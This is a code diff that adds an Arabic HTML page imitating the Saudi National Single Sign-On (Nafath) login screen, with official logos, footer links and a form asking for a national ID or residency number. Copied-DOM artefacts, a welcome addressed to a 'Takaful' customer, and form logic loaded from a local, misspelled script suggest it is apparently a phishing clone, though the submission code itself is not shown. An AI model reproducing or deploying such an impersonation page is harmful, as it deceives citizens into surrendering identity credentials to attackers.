@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>National Single Sign-On</title>
+  <meta name="description" content="National Single Sign-On">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Stylesheet -->
+  <link rel="stylesheet" href="/iam/css/iam.css">
+  <link rel="shortcut icon" href="/iam/img/logo (1).png" type="image/x-icon" />
+
+  <!-- Main JavaScript -->
+  <script src="/iam/js/ID_ErorrAR.js"></script>
+</head>
+
+<body>
+  <div class="o-page">
+    <div class="container-fluid u-p-zero">
+      <div class="container-fluid u-p-zero">
+        <header class="c-navbar u-mb-large">
+          <a class="c-navbar__brand u-ml-medium" href="/idpinit/ar/splist.jsp">
+            <img src="/iam/img/logo (1).png" width="128" />
+          </a>
+          <img src="/iam/img/vision2030-grey.svg" width="128"
+            class="u-opacity-heavy u-ml-auto u-hidden-down@mobile" />
+
+          <!-- Navigation items -->
+          <nav class="c-navbar__nav collapse u-border-bottom" id="main-nav">
+            <ul class="c-navbar__nav-list">
+              <li class="c-navbar__nav-item">
+                <a class="c-navbar__nav-link" href="/iam/html/iam-E.html"><i class="feather icon-globe"></i>
+                  English</a>
+              </li>
+            </ul>
+          </nav>
+
+          <!-- Start of Dropdown Menus -->
+          <div id="currentUserNavMain" class="c-dropdown dropdown u-mr-small hide">
+            <div class="dropdown-toggle c-notification c-btn c-btn--outline c-btn--small c-btn--secondary"
+              id="dropdownMenuAvatar" data-toggle="dropdown" role="button">
+              <i class="c-notification__icon feather icon-user">
+                <span id="currentAuthUser"></span></i>
+            </div>
+            <div class="c-dropdown__menu dropdown-menu has-arrow dropdown-menu-right">
+              <a class="c-dropdown__item dropdown-item" href="/idpinit/ar/userprofile.jsp">معلوماتي</a>
+              <a class="c-dropdown__item dropdown-item" href="/idpinit/logout">تسجيل الخروج</a>
+            </div>
+          </div>
+          <!-- End of Dropdown Menus -->
+
+          <!-- // Navigation items  -->
+          <button class="c-navbar__nav-toggle collapsed" type="button" data-toggle="collapse"
+            data-target="#main-nav" aria-expanded="false">
+            <i class="feather icon-menu"></i>
+          </button>
+        </header>
+      </div>
+    </div>
+
+    <div class="container">
+      <div id="bnfInfo" class="row u-justify-center">
+        <h2 id="bnfLabel" class="u-color-primary u-mb-small u-text-center">
+          مرحبا بك عزيزي عميل/ تكاتف، في خدمة النفاذ الوطني الموحد
+        </h2>
+      </div>
+
+      <div class="content active" id="pl1" style="max-height: 1200px; width: 100%">
+        <div class="row u-justify-center">
+          <div class="col-md-8">
+            <div class="c-card">
+              <div class="row">
+                <div class="col-md-6">
+                  <form novalidate="novalidate" id="login-form">
+
+                    <div class="c-field u-mb-medium">
+                      <label class="c-field__label" for="NAT_ID">رقم بطاقة
+                        الأحوال/الاقامة</label>
+                      <input class="c-input" id="NAT_ID" name="NAT_ID" type="tel" autocomplete="off"
+                        placeholder="أدخل رقم الأحوال/الاقامة الخاص بك هنا" onkeypress="Validate_NAT_ID()"
+                        maxlength="10" fdprocessedid="cwzab" />
+                      <span class="error-message" style="color: red;"></span>
+                      <span id="errorMessage"></span>
+
+                    </div>
+                    <div class="c-field u-text-center">
+
+                      <button type="submit" name="btnAuthenticate" class="c-btn c-btn--fullwidth"
+                        fdprocessedid="9m1nq9">
+                        <i class="feather icon-log-in"></i>تسجيل الدخول
+                      </button>
+
+                      <div class="u-mt-medium u-color-secondary">
+                        <p>لتحميل تطبيق نفاذ</p>
+                      </div>
+                      <div class="u-flex justify-content-center g-8">
+                        <a id="link" href="https://apps.apple.com/sa/app/نفاذ-nafath/id1598909871"
+                          target="_blank"><img src="/iam/img/apple_store.png" width="100" height="100" /></a>
+                        <a style="margin-right: 10px" id="link_andr"
+                          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid" target="_blank"><img
+                            src="/iam/img/google_play.png" width="100" height="100" /></a>
+                        <a style="margin-right: 12px" id="link_andr"
+                          href="https://appgallery.huawei.com/app/C106870695" target="_blank"><img
+                            src="/iam/img/huawei_store.jpg" width="120" /></a>
+                      </div>
+                    </div>
+                  </form>
+                  <div class="clr"></div>
+                </div>
+
+                <div
+                  class="col-md-5 u-text-center u-p-small u-mh-small u-hidden-down@mobile u-color-secondary">
+                  <img src="/iam/img/secure.svg" width="150" />
+                  <p>
+                    الرجاء إدخال رقم بطاقة الأحوال/الاقامة، ثم اضغط دخول.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="clr"> </div>
+        <script> let flag = false; function handleClick(value, placeholder, atr) { let e = window.event; e.preventDefault(); if (atr === 'collapsible active') { flag = true; } else { startOverAuth(value, placeholder); flag = false; } } let seloption = option || 1; window.addEventListener('load', function () { slelectAuth(seloption, "pl" + seloption); }); var coll = document.getElementsByClassName("collapsible"); var i; coll[seloption - 1].classList.toggle("active"); var content = coll[seloption - 1].nextElementSibling; content.style.maxHeight = "1200px"; content.style.width = "100%"; content.classList.toggle("active"); for (i = 0; i < coll.length; i++) { coll[i].addEventListener("click", function () { if (flag) { return false; } document.querySelectorAll(".collapsible").forEach(function (el, index) { if (el.classList.value === 'collapsible active') { el.classList.toggle("active"); el.nextElementSibling.style.maxHeight = null; el.nextElementSibling.innerHTML = ''; el.nextElementSibling.classList.toggle("active"); } }); this.classList.toggle("active"); var content = this.nextElementSibling; content.classList.toggle("active"); content.style.maxHeight = "1200px"; content.style.width = "100%"; }); } </script>
+      </div>
+    </div>
+    <!-- // .container -->
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-12">
+          <footer class="c-footer u-mt-large u-justify-between">
+            <div class="o-media">
+              <div class="o-media__img u-ml-small">
+                <div class="c-avatar">
+                  <img class="c-avatar__img" src="/iam/img/NIC-logo.png" alt="NIC-logo" />
+                </div>
+              </div>
+
+              <div class="o-media__content u-mt-small">
+                <p>تطوير وتشغيل</p>
+                <h5 class="u-color-secondary">مركز المعلومات الوطني</h5>
+                <p>النفاذ الوطني الموحد جميع الحقوق محفوظة © 2024</p>
+              </div>
+            </div>
+            <nav>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/authservice/userauthservice?lang=ar">الرئيسية</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/ar/about.html">حول</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/ar/contact.html">اتصل بنا</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/ar/terms.html">الشروط والأحكام</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/ar/help.html">المساعدة والدعم</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/ar/privacy.html">سياسة الخصوصية</a>
+            </nav>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <!-- spinner -->
+  <div id="spinner" class="overlayWrapper u-m-0" style="
+        position: fixed;
+        display: none;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 2;
+        cursor: pointer;
+      ">
+    <div class="overlayBG"></div>
+    <div id="loading" class="overlayContainerOuter" style="text-align: center; padding-top: 20%">
+      <div class="overlayContainerInner u-p-medium" style="background-color: white">
+        <div class="spinnerContent">
+          <div class="modalDetails">
+            <div class="loading_msg">
+              <img alt="" src="/images/en/loader.gif" /><br />
+              جاري المعالجة ، نرجو الإنتظار ...
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- spinner -->
+
+  <div id="browserErrorsOverlay" class="overlayWrapper" style="display: none">
+    <div class="overlayBG"></div>
+    <div class="overlayContainerOuter">
+      <div class="overlayContainerInner">
+        <div id="browserErrorsOverlayContent" class="overlayContent"
+          style="width: 630px;text-align: center; !important;">
+          <div>
+            <a href="#" class="overlayClose overlayClose_iconed"
+              ></a>
+          </div>
+          <h2>
+            <img src="/images/moi_logo_rtl.gif" width="500" style="border-style: none" />
+          </h2>
+          <hr />
+
+          <div class="modalDetails">
+            <p class="disclaimerright error_dir" dir="rtl">
+              عذراً, المتصفح المستخدم لديك قديم أو غير مدعوم. لذلك يتوجب عليك
+              تحديث متصفحك لآخر إصدار حتى تتمكن من استخدام الخدمات المتوفرة
+              بالموقع.
+            </p>
+            <br />
+            <br />
+            <br />
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    var data =
+      '{"label" :"الدخول على النظام", "image" : "User_Authentication.png", "description" : "للدخول على نظام الهوية الرقمية، يرجى التحقق باستخدام احدى الطرق المتاحة"}';
+    beneficiaryInfo(data);
+  </script>
+  <script>
+    var options =
+      '{  "options" : [ {    "name" : "تطبيق نفاذ",    "steps" : [ "USER_VALIDATION_NATID_STEP_NO_CAPTCHA", "INTIDP_HAWYATI_AUTH_PAM", "POLICY_ENFORCEMENT_STEP", "USER_CONSENT_STEP", "AUTH_SUCCESS" ],    "value" : 1,    "image" : "smartphone",    "external" : false,    "selected" : true  }, {    "name" : "اسم المستخدم وكلمة المرور",    "steps" : [ "UP_NID_AUTHENTICATION", "USER_VALIDATION_STEP", "OTP_AUTHENTICATION", "POLICY_ENFORCEMENT_STEP", "USER_CONSENT_STEP", "AUTH_SUCCESS" ],    "value" : 2,    "image" : "unlock",    "external" : false,    "selected" : false  } ]}';
+    buildChooseSequenceForm(options);
+  </script>
+  <span id="PING_IFRAME_FORM_DETECTION" style="display: none"></span>
+
+
+
+
+</body>
+
+</html>
